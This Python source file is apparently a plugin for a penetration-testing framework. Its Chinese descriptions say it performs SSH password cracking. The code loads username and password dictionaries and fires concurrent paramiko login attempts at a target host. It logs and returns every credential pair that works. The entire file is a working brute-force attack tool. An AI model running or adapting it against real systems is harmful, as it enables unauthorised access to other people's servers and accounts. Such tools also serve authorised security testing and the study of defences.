# -*-* coding:UTF-8
import os
import paramiko


class Plugin(Base):
    __info__ = {
        "author": "doimet",
        "references": ["-"],
        "description": "ssh服务口令破解",
        "datetime": "2021-12-31"
    }

    @cli.options('port', desc="设置爆破端口", default=22)
    @cli.options('method', desc="设置口令爆破的模式,1:单点模式;2:交叉模式", default=1)
    @cli.options('username', desc="用户账号或字典文件", default=os.path.join('data', 'ssh_username'))
    @cli.options('password', desc="用户密码或字典文件", default=os.path.join('data', 'ssh_password'))
    @cli.options('timeout', desc="设置连接超时时间", default=5)
    def ip(self, port, method, username, password, timeout) -> dict:
        with self.async_pool(max_workers=self.target.setting.asyncio, threshold=self.threshold) as execute:
            for u, p in self.build_login_dict(
                    method=method,
                    username=username,
                    password=password,
            ):
                execute.submit(self.task, port, u, p, timeout)
            return {'LoginInfo': execute.result()}

    async def task(self, port, username, password, timeout):
        self.log.debug(f'Login => username: {username}, password: {password}')
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(
            hostname=self.target.value,
            port=port,
            username=username,
            password=password,
            timeout=timeout
        )
        ssh.close()
        self.log.info(f'Login => username: {username}, password: {password} [success]')
        return {
            'port': port,
            'server': 'ssh',
            'username': username,
            'password': password
        }
